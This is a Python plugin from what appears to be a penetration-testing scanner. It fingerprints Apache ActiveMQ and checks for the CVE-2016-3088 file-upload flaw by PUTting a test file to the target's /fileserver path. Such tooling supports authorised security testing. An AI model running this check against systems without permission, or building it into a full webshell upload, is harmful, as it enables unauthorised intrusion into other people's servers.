# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-06 21:45
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import BugType, BugLevel
from core.MyAsyncHttp import *


class Script(BaseScript):
    name = 'ActiveMQ'

    def __init__(self, target, pbar, semaphore):
        super().__init__()
        # basic
        self.target = target
        self.bugLevel = BugLevel.HIGH
        self.bugType = BugType.UPLOADFILE
        self.bugNumber = 'CVE-2016-3088'
        self.refer = 'https://paper.seebug.org/346/'
        self.pbar = pbar
        self.semaphore = semaphore
        # main
        self.detectList = ['/']
        self.payloadList = ['/fileserver/test.txt']
        self.execList = ['']

    async def detect(self):
        try:
            async with self.semaphore:
                async with aiohttp.ClientSession(headers=self.headers) as session:
                    for detectPath in self.detectList:
                        url = f'http://{self.target}{detectPath}' if self.target.startswith(
                            ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                        text = await AsyncFetcher.fetch(session=session, url=url)
                        if 'ActiveMQ' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('ActiveMQ Finger', url))
                            return {'name': 'ActiveMQ Finger', 'url': url, 'software': 'ActiveMQ'}
        except Exception:
            return None

    async def exec(self):
        try:
            async with self.semaphore:
                async with aiohttp.ClientSession(headers=self.headers) as session:
                    for payload in self.payloadList:
                        url = f'http://{self.target}{payload}' if self.target.startswith(
                            ('http:', 'https:')) is False else f'{self.target}{payload}'
                        data = 'test'
                        async with session.put(url=url, data=data) as response:
                            status = response.status
                            if status == 204:
                                tqdm.write(Fore.RED + '[{}] {}'.format('ActiveMQ PUT FILE', url))
                                return {'name': 'ActiveMQ PUT FILE', 'url': url, 'software': 'ActiveMQ'}
        except Exception:
            return None

    # async def exec(self):
    #     try:
    #         async with self.semaphore:
    #             async with aiohttp.ClientSession() as session:
    #                 for exec in self.execList:
    #                     # exec = quote(exec)
    #                     url = f'http://{self.target}{exec}' if self.target.startswith(
    #                         ('http:', 'https:')) is False else f'{self.target}{exec}'
    #                     # print(url)
    #                     text = await AsyncFetcher.fetch(session=session, url=url)
    #                     if 'chiling' in text:
    #                         tqdm.write(Fore.RED + '[{}] {}'.format('ActiveMQ PUT FILE', url))
    #                         self.flag = True
    #                         return {'name': 'ActiveMQ PUT FILE', 'url': url, 'software': 'ActiveMQ'}
    #     except Exception:
    #         return None

    async def attack(self):
        a = await self.detect()
        if a is not None:
            self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    sem = asyncio.Semaphore(500)
    sc = Script('192.168.4.137:8161', 1, sem)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack())
